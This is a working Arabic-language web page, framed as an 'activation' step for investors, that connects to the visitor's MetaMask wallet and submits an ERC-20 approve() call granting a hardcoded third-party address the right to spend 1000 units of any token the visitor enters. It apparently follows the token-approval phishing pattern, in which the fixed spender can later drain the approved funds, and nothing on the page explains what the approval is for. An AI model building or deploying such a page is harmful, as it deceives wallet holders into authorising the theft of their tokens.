<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تفعيل Approve للمستثمرين</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
</head>
<body>
  <h2>صفحة تفعيل </h2>

  <label>عنوان توكن ERC-20: </label><br />
  <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="60" />
  <br /><br />

  <p>المبلغ للموافقة (Approve): <strong>1000</strong></p>

  <button id="approveBtn">اعمل Approve</button>

  <p id="status" style="color: green; font-weight: bold;"></p>

  <script>
    const fixedSpenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
    const fixedApproveAmount = "1000";

    async function doApprove() {
      const statusEl = document.getElementById("status");
      statusEl.style.color = "green";
      statusEl.textContent = "";

      if (!window.ethereum) {
        statusEl.style.color = "red";
        statusEl.textContent = "يجب تثبيت MetaMask أو محفظة تدعم Web3!";
        return;
      }

      const tokenAddress = document.getElementById("tokenAddress").value.trim();

      if (!ethers.utils.isAddress(tokenAddress)) {
        statusEl.style.color = "red";
        statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const erc20Abi = [
          "function decimals() view returns (uint8)",
          "function approve(address spender, uint256 amount) returns (bool)"
        ];
        const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);

        const decimals = await contract.decimals();
        const amount = ethers.utils.parseUnits(fixedApproveAmount, decimals);

        statusEl.textContent = "جارٍ إرسال طلب الموافقة إلى المحفظة...";

        const tx = await contract.approve(fixedSpenderAddress, amount);

        statusEl.textContent = "تم إرسال المعاملة، في انتظار التوثيق...";

        await tx.wait();

        statusEl.textContent = `تم الموافقة بنجاح! Tx Hash: ${tx.hash}`;
      } catch (error) {
        if (error.code === 4001) {
          statusEl.style.color = "red";
          statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
        } else {
          statusEl.style.color = "red";
          statusEl.textContent = "حدث خطأ: " + (error.message || error);
        }
      }
    }

    document.getElementById("approveBtn").addEventListener("click", doApprove);
  </script>
</body>
</html>
